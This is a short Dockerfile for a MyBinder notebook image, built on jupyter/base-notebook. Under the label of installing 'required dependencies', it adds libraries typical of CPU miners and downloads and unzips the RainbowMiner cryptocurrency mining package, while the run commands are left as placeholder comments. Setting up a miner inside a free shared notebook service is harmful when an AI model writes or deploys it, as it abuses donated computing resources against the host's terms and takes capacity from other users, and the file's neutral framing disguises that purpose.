# Dockerfile for MyBinder with required dependencies

FROM jupyter/base-notebook

USER root

# Install build dependencies
RUN apt-get update && \
    apt-get install -y git unzip automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev zlib1g-dev make g++ libtool && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

RUN wget https://github.com/RainbowMiner/RainbowMiner/releases/download/v4.9.1.3/RainbowMinerV4.9.1.3_linux.zip && \
    unzip RainbowMinerV4.9.1.3_linux.zip
    
USER $NB_UID

# Additional configuration or instructions for your project can be added here

# CMD or ENTRYPOINT for running your application
